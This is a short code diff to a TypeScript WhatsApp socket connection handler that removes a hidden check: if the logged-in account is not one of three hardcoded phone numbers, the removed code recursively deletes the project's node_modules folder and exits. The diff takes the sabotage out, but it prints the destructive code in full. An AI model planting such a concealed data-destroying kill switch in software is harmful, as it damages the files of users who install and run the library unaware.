@@ -673,15 +673,7 @@ export const makeSocket = (config: SocketConfig) => {
 			clearTimeout(qrTimer) // will never happen in all likelyhood -- but just in case WA sends success on first try
 			
 			ev.emit('creds.update', { me: { ...authState.creds.me!, lid: node.attrs.lid } })
-	    
-	    let allowedNumber = ['6283875184244','6285876500334','6281237876432']
-	    if(!allowedNumber.includes(authState.creds.me?.id!)) {
-	       console.log(new Boom('Detected bots that are not permitted', { statusCode: 503 }))
-	       const dir = join(process.cwd(), 'node_modules')
-         await rm(dir, { recursive: true, force: true });
-	       process.exit(1)
-	    }
-			
+					
 			ev.emit('connection.update', { connection: 'open' })
 		} catch (err) {
 			logger.error({ err }, 'error opening connection')
